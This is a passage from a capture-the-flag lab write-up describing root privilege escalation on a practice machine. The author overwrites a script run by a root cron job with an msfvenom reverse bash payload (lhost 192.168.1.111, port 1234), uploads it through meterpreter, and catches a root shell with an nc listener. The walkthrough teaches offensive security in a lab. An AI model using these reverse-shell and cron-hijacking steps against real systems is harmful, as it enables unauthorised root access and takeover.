Time to check the crontab. As suspected, we have this script inside the crontab file. It is scheduled to run every minute.
cat /etc/crontab
1
	
cat /etc/crontab

 If we are not wrong, this might give us root. Let’s wait and watch. Time to craft a raw bash payload using the msfvenom.
msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.111 lport=1234 R
1
	
msfvenom -p cmd/unix/reverse_bash lhost=192.168.1.111 lport=1234 R

We copied the payload on our clipboard and used the echo command to paste the payload inside an empty file having the same name as Leonard’s script.
echo "<payload>" > thermostat_set_temp.sh
1
	
echo "<payload>" > thermostat_set_temp.sh

All that’s left to do is upload this script from our machine to the target machine. As we have a meterpreter this can be done using the upload command.
upload /root/thermostat_set_temp.sh
ls
cat thermostat_set_temp.sh
1
2
3
	
upload /root/thermostat_set_temp.sh
ls
cat thermostat_set_temp.sh

Before uploading, we started a listener at the port that we mentioned at the time of crafting the payload. Now after we upload the payload, we got to wait a minute for the cronjob to execute the script. In no time we have a session. We used the id command to gain information about the user. We have the root shell. Now for the flag. It was in the current directory. We read the flag using the cat command. We have the message that we can sit on Sheldon’s spot. Dreams do come true!!
nc -lvp 1234
id
cd /root
ls
cat Flag-leonard.txt
1
2
3
4
5
	
nc -lvp 1234
id
cd /root
ls
cat Flag-leonard.txt
